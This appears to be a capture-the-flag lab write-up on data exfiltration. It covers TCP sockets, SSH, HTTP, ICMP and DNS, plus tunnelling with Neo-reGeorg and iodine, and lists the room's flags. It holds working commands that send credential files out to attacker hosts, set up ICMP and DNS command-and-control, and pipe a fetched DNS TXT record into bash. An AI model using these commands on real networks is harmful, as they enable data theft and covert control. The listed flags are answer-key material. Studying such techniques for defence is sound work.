# Data Exfiltration - Hard

1. [Data Exfiltration](#data-exfiltration)
2. [Exfiltration using TCP socket](#exfiltration-using-tcp-socket)
3. [Exfiltration using SSH](#exfiltration-using-ssh)
4. [Exfiltration using HTTP(S)](#exfiltrate-using-https)
5. [Exfiltration using ICMP](#exfiltration-using-icmp)
6. [DNS Configurations](#dns-configurations)
7. [Exfiltration using DNS](#exfiltration-over-dns)
8. [DNS Tunneling](#dns-tunneling)

## Data Exfiltration

* Data exfiltration - taking unauthorized copy of sensitive data and moving it from the inside of an organization's network to the outside; post-compromised process.

* Use case scenarios of data exfiltration:

  * Exfiltrate data
  * C2 communications
  * Tunneling

```markdown
1. In which case scenario will sending and receiving traffic continue during the connection? - Tunneling

2. In which case scenario will sending and receiving traffic be in one direction? - Traditional data exfiltration
```

## Exfiltration using TCP socket

* Using TCP socket and data encoding to exfiltrate data is easy to detect as we rely on non-standard protocols.

```shell
#to establish tcp communication, we have 2 machines
#victim1.thm.com and jump.thm.com (JumpBox)

#setup listener on JumpBox
nc -lvp 8080 > /tmp/task4-creds.data
#once we receive data on port 80, it would be stored in that file

ssh thm@10.10.224.91 -p 2022
#connecting to victim1.thm.com on attacker machine

#we can view the creds file in ssh
cat task4/creds.txt

#using tcp socket to exfiltrate data 
tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
#tar zcf to create archive file, base64 for encoding
#dd ebcdic to create encoded backup file
#finally the file is transferred using tcp socket to JumpBox, port 8080

#now, on JumpBox, we can check exfiltrated data
cd /tmp/

ls -la

dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar
#converts file to ascii, then decodes base64 content

tar xvf task4-creds.tar
#unarchive file to get creds in plaintext
```

```markdown
1. Exfiltration using TCP sockets relies on ____________ protocols! - non-standard
```

## Exfiltration using SSH

* As SSH establishes a secure channel to move data, all transmission data is encrypted over the network.

```shell
#after connecting to victim1 machine on attacker machine via ssh
cat task5/creds.txt
#we need to transfer the creds to JumpBox via ssh

#on attacker machine
tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
#similar to previous one, we archive required file
#then we pass the archived file over ssh
#without having full ssh session
#the command goes to tmp directory and unarchives the creds file

#on JumpBox we can view the file
cat /tmp/task5/creds.txt
```

```markdown
1. All packets sent using the Data Exfiltration technique over SSH are encrypted? - T
```

## Exfiltrate using HTTP(S)

* For data exfiltration using HTTP/HTTPS protocol, attacker needs control over webserver with server-side programming language enabled.

```shell
#we can use POST HTTP method for data exfiltration
#on JumpBox
ssh thm@web.thm.com

sudo cat /var/log/apache2/access.log
#decode the base64 text to get flag

#now, for given scenario
#attacker controls web.thm.com
#we need to send data from victim1.thm.com machine
#attacker has set up php page to get data

#from attacker machine, connect to victim1.thm.com
ssh thm@10.10.224.91 -p 2022

ls -la
#we need to transfer task6 contents to another machine via HTTP

curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
#using curl with --data to send POST request via file
#where file is base64-encoded archive of secret folder

#now we can check /tmp directory in webserver
#in JumpBox
ls -l /tmp/
#this includes http.bs64 file

cat /tmp/http.bs64
#requires correction for URL encoding over HTTP

sudo sed -i 's/ /+/g' /tmp/http.bs64

cat /tmp/http.bs64 | base64 -d | tar xvfz -
#this gives us the creds file
```

```shell
#we can use HTTP Tunneling method
#by given scenario, we upload an HTTP tunnel agent file to a victim webserver uploader.thm.com
#for communicating with app.thm.com

#on attacker machine, we can use a Neo-reGeorg tool
#to establish a communication channel to access internal network devices
cd /opt/Neo-reGeorg

python3 neoreg.py generate -k thm
#generate encrypted client file to upload to victim web server
#key is thm
#we can upload tunnel.php file via uploader machine

#uploading tunnel.php on http://10.10.224.91/uploader using admin as key
#after upload, we can access it on http://10.10.224.91/uploader/files/tunnel.php

#now we can connect to tunneling client
python3 neoreg.py -k thm -u http://10.10.224.91/uploader/files/tunnel.php
#now we can use tunnel connection as proxy binds on 127.0.0.1:1080

#to access flag.thm.com, we can use curl with sock5
curl --socks5 127.0.0.1:1080 http://172.20.0.120:80
#shows that flag is in /flag directory

curl --socks5 127.0.0.1:1080 http://172.20.0.120:80/flag
#gives flag
```

```markdown
1. Check the Apache log file on web.thm.com  and get the flag! - THM{H77P-G37-15-f0un6}

2. When you visit the http://flag.thm.com/flag website through the uploader machine via the HTTP tunneling technique, what is the flag? - THM{H77p_7unn3l1n9_l1k3_l337}
```

## Exfiltration using ICMP

```shell
#icmp data exfiltration
#using metasploit

#in attacker machine
msfconsole

use auxiliary/server/icmp_exfil

set BPF_FILTER icmp and not src 10.10.224.91
#where 10.10.224.91 is the attacker IP

set INTERFACE eth0

run

#now in JumpBox machine, we need to log into icmp.thm.com machine
ssh thm@icmp.thm.com

#we need to send BOF trigger from icmp.thm.com machine, using nping tool
#for the msf exploit to work
sudo nping --icmp -c 1 10.10.224.91 --data-string "BOFfile.txt"
#msf identifies the trigger value and waits for data

sudo nping --icmp -c 1 10.10.224.91 --data-string "admin:password"

sudo nping --icmp -c 1 10.10.224.91 --data-string "admin2:password2"

sudo nping --icmp -c 1 10.10.224.91 --data-string "EOF"
#after EOF, msf generates lootfile with path
```

```shell
#icmp c2 communication
#using icmpdoor tool

#on the icmp.thm.com machine, execute the icmpdoor binary
sudo icmpdoor -i eth0 -d 192.168.0.133

#now in JumpBox machine, execute the icmp-cnc binary
sudo icmp-cnc -i eth1 -d 192.168.0.121
#this starts a c2 channel
#we can enter commands and it will show us the output
#use 'getFlag' command to get the flag
```

```markdown
1. In which ICMP packet section can we include our data? - data

2. Follow the technique discussed in this task to establish a C2 ICMP connection between JumpBox and ICMP-Host. Then execute the "getFlag" command. What is the flag? - THM{g0t-1cmp-p4k3t!}
```

## DNS Configurations

```shell
#configure DNS according to task instructions
#for flag
dig +short flag.thm.com 
```

```markdown
1. Once the DNS configuration works fine, resolve the flag.thm.com  domain name. What is the IP address? - 172.20.0.120
```

## Exfiltration over DNS

```shell
#dns data exfiltration

#on Attackbox
#connect to attacker machine
ssh thm@10.10.224.91 -p 2322

sudo tcpdump -i eth0 udp port 53 -v
#capture network traffic for incoming UDP/53 packets

#now, connecting to victim2 machine on Attackbox
ssh thm@10.10.224.91 -p 2122

cat task9/credit.txt
#data to be exfiltrated

#we need to encode data, then split it
#to fit into multiple DNS requests
#and concatenate it with subdomain name
#using dig to send it over DNS
cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash

#on attacker tcpdump, we have received the data
echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com" | cut -d"." -f1-8 | tr -d "." | base64 -d
#this gives us the data back in ascii form
```

```shell
#dns c2 communication

cat /tmp/script.sh | base64
#encode required script in base64

#now we can add the base64 representation
#as a TXT DNS record to the domain we control
#through the given web interface
#for flag.tunnel.com

dig +short -t TXT flag.tunnel.com

dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
#this gives us the flag
```

```markdown
1. What is the maximum length for the subdomain name (label)? - 63

2. The Fully Qualified FQDN domain name must not exceed ______ characters. - 255

3. Execute the C2 communication over the DNS protocol of the flag.tunnel.com. What is the flag? - THM{C-tw0-C0mmun1c4t10ns-0v3r-DN5}
```

## DNS Tunneling

```shell
#dns tunneling (tcp over dns)
#using iodine tool

#on attacker machine
sudo iodined -c -P thmpass 10.1.1.1/24 att.tunnel.com 
#run iodined in server-side
#this creates a new network interface dns0 for dns tunneling
#server ip is 10.1.1.1
#client ip is 10.1.1.2

#on JumpBox
sudo iodine -P thmpass att.tunnel.com
#iodine is client-side here

ifconfig

ssh thm@10.1.1.1
#ssh into attacker machine through dns0

ssh thm@10.1.1.2 -4 -f -N -D 1080
#ssh into background and -4 for IPv4 binding

#now on attacker machine
curl --socks5 127.0.0.1:1080 http://192.168.0.100/test.php
#this gives the flag
```

```markdown
1. When the iodine connection establishes to Attacker, run the ifconfig command. How many interfaces are there? - 4

2. What is the network interface name created by iodined? - dns0

3. Use the DNS tunneling to prove your access to the webserver, http://192.168.0.100/test.php . What is the flag? - THM{DN5-Tunn311n9-1s-c00l}
```
